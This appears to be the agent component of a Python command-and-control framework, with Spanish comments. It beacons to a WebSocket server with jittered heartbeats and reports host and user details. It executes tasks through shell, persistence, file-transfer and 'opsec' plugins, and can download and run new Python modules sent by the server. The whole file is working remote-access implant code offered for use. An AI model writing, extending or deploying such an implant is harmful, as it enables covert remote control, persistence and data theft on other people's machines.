"""
agent.py — Agente C2 Aligo.

Flujo:
  1. Conecta al servidor vía WebSocket.
  2. Envía HELLO con metadatos del sistema.
  3. Completa handshake RSA → establece sesión AES-256-GCM.
  4. Loop:
     - Envía HEARTBEAT cada N segundos.
     - Escucha TASK, ejecuta en el plugin correspondiente, envía RESULT.
     - Reconexión automática con backoff exponencial ante cualquier fallo.

Hot-swap: el servidor puede enviar TASK con plugin="__load__" para
cargar un módulo Python en base64 sin reiniciar el agente.
"""

from __future__ import annotations

import asyncio
import base64
import importlib
import importlib.util
import json
import logging
import os
import platform
import random
import socket
import sys
import tempfile
import time
import uuid
from pathlib import Path
from typing import Any

import websockets
from cryptography.hazmat.primitives import serialization

# Aseguramos que el directorio del agente esté en el path
sys.path.insert(0, str(Path(__file__).parent))

from plugins.base import BasePlugin
from plugins.filetransfer import FileTransferPlugin
from plugins.opsec import OpsecPlugin
from plugins.persist import PersistPlugin
from plugins.shell import ShellPlugin
from plugins.sysinfo import SysInfoPlugin

# Importamos crypto y protocol del servidor (path relativo al proyecto)
# En producción, agent/ llevaría sus propias copias de estos módulos.
_root = Path(__file__).parent.parent / "server"
sys.path.insert(0, str(_root))

from core import crypto
from core.protocol import (
    HandshakeAgentPayload,
    HeartbeatPayload,
    Message,
    MessageType,
    ResultPayload,
    TaskPayload,
)

logging.basicConfig(
    level=os.getenv("AGENT_LOG_LEVEL", "INFO"),
    format="%(asctime)s [%(levelname)s] agent: %(message)s",
)
logger = logging.getLogger("agent")

HEARTBEAT_INTERVAL = float(os.getenv("HEARTBEAT_INTERVAL", "10"))
HEARTBEAT_JITTER   = float(os.getenv("HEARTBEAT_JITTER", "0.3"))   # ±30% por defecto
AGENT_LABEL        = os.getenv("AGENT_LABEL", "")   # etiqueta para multi-agente en el mismo host
RECONNECT_BASE = 2.0
RECONNECT_MAX = 60.0


class Agent:
    def __init__(self, server_url: str, label: str = "") -> None:
        self.server_url = server_url
        self.label = label or AGENT_LABEL
        self.agent_id: str = ""
        self.session_key: bytes | None = None

        # Keypair propio del agente (para extensión mTLS opcional)
        self._priv, self._pub = crypto.generate_rsa_keypair()
        self._pub_pem = crypto.export_public_key_pem(self._pub).decode("ascii")

        # Clave pública del servidor (recibida en handshake, para verificar plugins)
        self._server_pub = None
        # Referencia al websocket activo (para enviar alertas proactivas desde plugins)
        self._ws_ref = None

        # Plugins registrados
        self._plugins: dict[str, BasePlugin] = {}
        self._register_builtin_plugins()

    def _register_builtin_plugins(self) -> None:
        opsec = OpsecPlugin()
        opsec.alert_callback = self._send_opsec_alert
        for plugin in [ShellPlugin(), SysInfoPlugin(), opsec, PersistPlugin(), FileTransferPlugin()]:
            self._plugins[plugin.name] = plugin
        logger.info("Plugins cargados: %s", list(self._plugins.keys()))

    async def _send_opsec_alert(self, alert: dict) -> None:
        """Envía una alerta OPSEC proactiva al servidor como RESULT especial."""
        if not self.agent_id or not self._ws_ref:
            return
        from core.protocol import ResultPayload
        payload = ResultPayload(
            task_id=f"opsec_watch_{uuid.uuid4().hex[:8]}",
            ok=True,
            output=alert,
            duration_ms=0,
        )
        msg = Message(
            type=MessageType.RESULT,
            agent_id=self.agent_id,
            payload=payload.model_dump(),
        )
        try:
            await self._ws_ref.send(self._make_wire(msg))
            logger.warning("OPSEC ALERT enviada: risk=%s", alert.get("risk"))
        except Exception as exc:
            logger.error("No se pudo enviar OPSEC alert: %s", exc)

    # ------------------------------------------------------------------
    # Serialización cifrada
    # ------------------------------------------------------------------

    def _make_wire(self, msg: Message) -> str:
        if self.session_key is None:
            return msg.to_wire()
        body = msg.to_bytes_for_signature()
        env = crypto.encrypt(self.session_key, body, aad=msg.id.encode("ascii"))
        msg.sig = crypto.sign(self.session_key, body)
        return json.dumps({
            "id": msg.id,
            "type": msg.type.value,
            "agent_id": msg.agent_id,
            "ts": msg.ts,
            "sig": msg.sig,
            "envelope": env.to_dict(),
        })

    def _parse_wire(self, raw: str) -> Message | None:
        data = json.loads(raw)
        if "envelope" not in data:
            return Message.from_wire(raw)
        if self.session_key is None:
            return None
        env = crypto.Envelope.from_dict(data["envelope"])
        try:
            body = crypto.decrypt(self.session_key, env)
        except Exception as exc:
            logger.warning("Decrypt failed: %s", exc)
            return None
        msg = Message.model_validate_json(body)
        if not crypto.verify_signature(self.session_key, msg.to_bytes_for_signature(), data.get("sig", "")):
            logger.warning("Signature mismatch on msg %s", msg.id)
            return None
        return msg

    # ------------------------------------------------------------------
    # Handshake
    # ------------------------------------------------------------------

    async def _do_handshake(self, ws) -> bool:
        # 1. HELLO
        hello_payload: dict = {
            "protocol": "openc2/1.0",
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "arch": platform.machine(),
            "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
            "capabilities": list(self._plugins.keys()),
            "agent_pub_pem": self._pub_pem,
        }
        if self.label:
            hello_payload["label"] = self.label
        hello = Message(type=MessageType.HELLO, payload=hello_payload)
        await ws.send(hello.to_wire())
        label_str = f" [{self.label}]" if self.label else ""
        logger.info("HELLO enviado a %s%s", self.server_url, label_str)

        # 2. HANDSHAKE del servidor
        raw = await ws.recv()
        srv_hs = Message.from_wire(raw)
        if srv_hs.type != MessageType.HANDSHAKE:
            logger.error("Esperaba HANDSHAKE, recibí %s", srv_hs.type)
            return False

        server_pub = crypto.load_public_key_pem(
            srv_hs.payload["server_pub_pem"].encode("ascii")
        )
        self._server_pub = server_pub  # guardar para verificar plugins firmados
        challenge: str = srv_hs.payload["challenge"]
        provisional_id: str = srv_hs.payload["agent_id"]
        logger.info("Server pub key recibida, agent_id provisional: %s", provisional_id)

        # 3. Generar session_key, cifrarla con RSA del server
        session_key = crypto.new_session_key()
        wrapped = crypto.wrap_session_key(server_pub, session_key)
        challenge_ack = crypto.sign(session_key, challenge.encode("ascii"))

        agent_hs = Message(
            type=MessageType.HANDSHAKE,
            agent_id=provisional_id,
            payload=HandshakeAgentPayload(
                wrapped_session_key=crypto.b64e(wrapped),
                challenge_ack=challenge_ack,
            ).model_dump(),
        )
        await ws.send(agent_hs.to_wire())

        # 4. Confirmación final del servidor (ya cifrada con sesión)
        self.session_key = session_key
        raw = await ws.recv()
        confirm = self._parse_wire(raw)
        if not confirm or not confirm.payload.get("ok"):
            logger.error("Handshake rechazado por el servidor")
            return False

        self.agent_id = confirm.payload["agent_id"]
        logger.info("Handshake completo. Agent ID: %s", self.agent_id)
        return True

    # ------------------------------------------------------------------
    # Loops
    # ------------------------------------------------------------------

    async def _heartbeat_loop(self, ws) -> None:
        try:
            import psutil
            has_psutil = True
        except ImportError:
            has_psutil = False

        start = time.time()
        while True:
            jitter = random.uniform(1.0 - HEARTBEAT_JITTER, 1.0 + HEARTBEAT_JITTER)
            await asyncio.sleep(HEARTBEAT_INTERVAL * jitter)
            hb = HeartbeatPayload(
                uptime=time.time() - start,
                cpu=__import__("psutil").cpu_percent() if has_psutil else None,
                mem=__import__("psutil").virtual_memory().percent if has_psutil else None,
                plugins=list(self._plugins.keys()),
            )
            msg = Message(
                type=MessageType.HEARTBEAT,
                agent_id=self.agent_id,
                payload=hb.model_dump(),
            )
            await ws.send(self._make_wire(msg))

    async def _task_loop(self, ws) -> None:
        async for raw in ws:
            msg = self._parse_wire(raw)
            if msg is None:
                continue
            if msg.type == MessageType.TASK:
                asyncio.create_task(self._handle_task(ws, msg))
            elif msg.type == MessageType.ERROR:
                logger.warning("Server error: %s", msg.payload)
            elif msg.type == MessageType.BYE:
                logger.info("Server says BYE, cerrando")
                break

    async def _handle_task(self, ws, msg: Message) -> None:
        task = TaskPayload(**msg.payload)
        logger.info("Task recibida: plugin=%s action=%s id=%s", task.plugin, task.action, task.task_id)

        start = time.monotonic()
        try:
            if task.plugin == "__load__":
                result = await self._hot_load_plugin(task.args)
            else:
                plugin = self._plugins.get(task.plugin)
                if plugin is None:
                    raise ValueError(f"Plugin no encontrado: {task.plugin}")
                result = await asyncio.wait_for(
                    plugin.execute(task.action, task.args),
                    timeout=task.timeout,
                )
            payload = ResultPayload(
                task_id=task.task_id,
                ok=True,
                output=result,
                duration_ms=round((time.monotonic() - start) * 1000, 2),
            )
        except Exception as exc:
            logger.warning("Task %s falló: %s", task.task_id, exc)
            payload = ResultPayload(
                task_id=task.task_id,
                ok=False,
                error=str(exc),
                duration_ms=round((time.monotonic() - start) * 1000, 2),
            )

        result_msg = Message(
            type=MessageType.RESULT,
            agent_id=self.agent_id,
            payload=payload.model_dump(),
        )
        await ws.send(self._make_wire(result_msg))

    # ------------------------------------------------------------------
    # Hot-swap de plugins
    # ------------------------------------------------------------------

    async def _hot_load_plugin(self, args: dict[str, Any]) -> dict:
        """
        Carga un plugin Python desde base64 verificando firma RSA-PSS.
        Si la firma es inválida: se rechaza y se loguea como anomalía.
        """
        name         = args.get("name")
        code_b64     = args.get("code_b64")
        signature_b64 = args.get("plugin_signature", "")

        if not name or not code_b64:
            raise ValueError("Hot-load requiere 'name' y 'code_b64'")

        code_bytes = base64.b64decode(code_b64)

        # ── Verificación RSA-PSS obligatoria ─────────────────────────────
        if not hasattr(self, "_server_pub") or self._server_pub is None:
            raise ValueError("No se recibió la clave pública del servidor en el handshake")

        if not signature_b64:
            logger.warning("SECURITY: plugin '%s' rechazado — falta plugin_signature", name)
            raise ValueError(f"Plugin '{name}' rechazado: sin firma RSA-PSS (posible ataque)")

        valid = crypto.verify_plugin_signature(self._server_pub, code_bytes, signature_b64)
        if not valid:
            logger.warning("SECURITY ALERT: plugin '%s' con firma INVÁLIDA — rechazado", name)
            raise ValueError(f"Plugin '{name}' rechazado: firma RSA-PSS inválida")

        logger.info("Plugin signature OK para '%s' — procediendo con carga", name)

        # ── Importación dinámica en archivo temporal ──────────────────────
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="wb") as f:
            f.write(code_bytes)
            tmp_path = f.name

        try:
            spec = importlib.util.spec_from_file_location(name, tmp_path)
            mod  = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            plugin_class = getattr(mod, "Plugin", None)
            if plugin_class is None:
                raise ValueError("El módulo debe exportar una clase 'Plugin'")
            plugin = plugin_class()
            if not plugin.validate():
                raise ValueError(f"Plugin.validate() retornó False para '{name}'")
            if name in self._plugins:
                await self._plugins[name].teardown()
            self._plugins[name] = plugin
            logger.info("Plugin hot-loaded y validado: %s v%s", name, plugin.version)
            return {
                "loaded": name,
                "version": plugin.version,
                "author": plugin.author,
                "actions": plugin.actions(),
            }
        finally:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    # ------------------------------------------------------------------
    # Conexión con backoff exponencial
    # ------------------------------------------------------------------

    async def run(self) -> None:
        backoff = RECONNECT_BASE
        while True:
            try:
                logger.info("Conectando a %s …", self.server_url)
                async with websockets.connect(
                    self.server_url,
                    ping_interval=20,
                    ping_timeout=30,
                    close_timeout=10,
                ) as ws:
                    if not await self._do_handshake(ws):
                        raise ConnectionError("Handshake fallido")
                    backoff = RECONNECT_BASE  # reset en conexión exitosa
                    self._ws_ref = ws
                    hb_task = asyncio.create_task(self._heartbeat_loop(ws))
                    try:
                        await self._task_loop(ws)
                    finally:
                        hb_task.cancel()
            except (websockets.ConnectionClosed, ConnectionError, OSError) as exc:
                logger.warning("Desconectado: %s. Reintentando en %.1fs …", exc, backoff)
            except Exception as exc:
                logger.error("Error inesperado: %s. Reintentando en %.1fs …", exc, backoff)
            finally:
                self.session_key = None
                self._ws_ref = None

            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, RECONNECT_MAX)


# ---------------------------------------------------------------------------
# CLI mínima
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="OpenC2 v1.0 — Agente")
    parser.add_argument("--server", default="ws://localhost:8000/ws", help="URL WebSocket del servidor")
    parser.add_argument("--label", default="", help="Etiqueta para identificar este agente (permite múltiples en el mismo host)")
    parser.add_argument("--log-level", default="INFO")
    args = parser.parse_args()

    logging.getLogger().setLevel(args.log_level.upper())
    asyncio.run(Agent(args.server, label=args.label).run())
